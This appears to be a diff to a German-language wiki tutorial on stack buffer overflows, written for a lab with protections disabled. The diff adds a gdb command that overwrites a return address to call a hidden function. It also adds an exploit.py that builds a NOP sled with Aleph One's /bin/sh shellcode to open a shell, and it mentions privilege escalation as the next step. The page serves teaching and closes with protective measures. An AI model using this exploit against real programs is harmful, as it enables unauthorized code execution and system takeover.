@@ -34,6 +34,7 @@ Damit folgende Beispiele funktionieren wurden einige Sicherheitsmaßnahmen im Be
 Siehe auch [[gdb (GNU Debugger)]]. Dieses CLI-Tool wurde verwendet um während des Programmablaufs den Speicher betrachten zu können.
 
 #### Konsolenausgabe
+`target0`:
 ``` C
 void versteckt() {
 	// Ausgabe eines Strings auf der Standardausgabe
@@ -62,18 +63,38 @@ int main() {
 	return 0;
 }
 ```
-Die Funktion `versteckt` wird innerhalb von dem Skript nie aufgerufen. Dennoch lässt sich das Programm über ein Kommandozeilenparameter so manipulieren, dass die Funktion `versteckt` aufgerufen wird. 
-Für die Variable `buffer` wurden 128 Bytes an Speicher allokiert. Im Anschluss an den für die Variable `buffer` reservierten Speicher liegt der `Stack Basepointer`. Da in `funk2` mit dem Methodenaufruf `strcpy` keine Kontrolle stattfindet, ob das Ziel des Kopiervorgangs auch groß genug ist für das übergebene char-Array, lässt sich ein `buffer overflow` herbeiführen und der `Stack Basepointer` manipulieren.
-In diesem Fall wird ein char-Array mit einer Länge von 136 Bytes benötigt um den `Stack Basepointer` zu überschreiben. Dabei stellen die letzten 4 Byte den `Stack Basepointer` dar. Wenn also die letzten 4 Byte des char-Arrays der physischen Adresse der `versteckt`-Funktion entsprechen, wird Diese ausgeführt.
+Die Funktion `versteckt` wird innerhalb von dem Skript `target0` nie aufgerufen. Dennoch lässt sich das Programm über ein Kommandozeilenparameter so manipulieren, dass die Funktion `versteckt` aufgerufen wird. 
+Für die Variable `buffer` wurden 128 Bytes an Speicher allokiert. Im Anschluss an den für die Variable `buffer` reservierten Speicher liegt der `Stack Basepointer` (4 Bytes )und im Anschluss daran die `Rücksprungadresse` (ebenfalls 4 Bytes). Da in `funk2` mit dem Methodenaufruf `strcpy` keine Kontrolle stattfindet, ob das Ziel des Kopiervorgangs auch groß genug ist für das übergebene char-Array, lässt sich ein `buffer overflow` herbeiführen und die `Rücksprungadresse` manipulieren.
+In diesem Fall wird ein char-Array mit einer Länge von 136 Bytes benötigt um den `Stack Basepointer` und die `Rücksprungadresse` zu überschreiben. Wenn also die letzten 4 Byte des char-Arrays der physischen Adresse der `versteckt`-Funktion entsprechen, wird Diese ausgeführt.
+
+Wenn man das ganze also innerhalb von [[gdb (GNU Debugger)]] durchführen möchte kann man folgenden Befehl verwenden:
+``` bash
+run target0 ``python -c "print('A'*132 + '\xbb' + '\x84' + '\x04' + '\x08')"`
+```
+Vorausgesetzt die physischen Adresse der `versteckt`-Funktion lautet `0x80484bb`
+Es entsteht zwar ein `Segmentation Fault` am Ende, doch vorher wurde die `versteckt`-Funktion ausgeführt.
 
 #### Öffnen einer Shell
-``` C
-int main() {
-
-}
+Statt einfach nur 132 A's in die `buffer`-Variable zu schreiben lässt sich auf diese Weise auch weiterer Maschinencode in ein Programm einschleusen. Zur Generierung des Maschinencodes für die Öffnung einer Shell, lässt sich folgendes Python-Skript nutzen:
+`exploit.py`
+``` python
+# Shellcode von Aleph One
+sc = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
+# Speicheradresse von buffer, little endian beachten
+buffer_addr = '\x8c\xf5\xff\xbf'
+length_buffer = 128
+size_ebp = 4 # Länge des Stack Basepointer (Bytes)
+size_eip = 4 # Länge der Rücksprungadresse (Bytes)
+total_length_input = length_buffer + size_ebp + size_eip
+# Ausgabe erzeugen, inkl. NOP Sliding
+print((total_length_input - len(sc) - len(buffer_addr)) * '\x90' + sc + buffer_addr) 
 ```
-
-Die dabei geöffnete Shell besitzt die gleichen Rechte, wie das ausgeführte Programm. Der nächste Schritt wäre nun eine `privilege escalation` zu erreichen um an `root`-Rechte zu kommen.
+Die Variable `buffer_addr` muss entsprechend auf die Adresse angepasst werden, wo die Variable im physischen Speicher abgelegt ist. Diese muss jedoch nicht ganz exakt sein, da folgend auf die Adresse die `NOP`-Operation (`\x90`) als eine Art "Landezone" steht. Dadurch funktionieren höhere Adressen (bis zu einem gewissen Grad) auch noch.
+Wenn man das ganze also innerhalb von [[gdb (GNU Debugger)]] durchführen möchte kann man folgenden Befehl verwenden:
+``` bash
+run `python exploit.py`
+```
+Die dabei geöffnete Shell besitzt die gleichen Rechte, wie das ausgeführte Programm. Der nächste Schritt wäre nun z.B. eine `privilege escalation` zu erreichen um an `root`-Rechte zu kommen.
 
 ## Schutzmaßnahmen gegen Pufferüberläufe: 
 <b>Never trust user input</b>
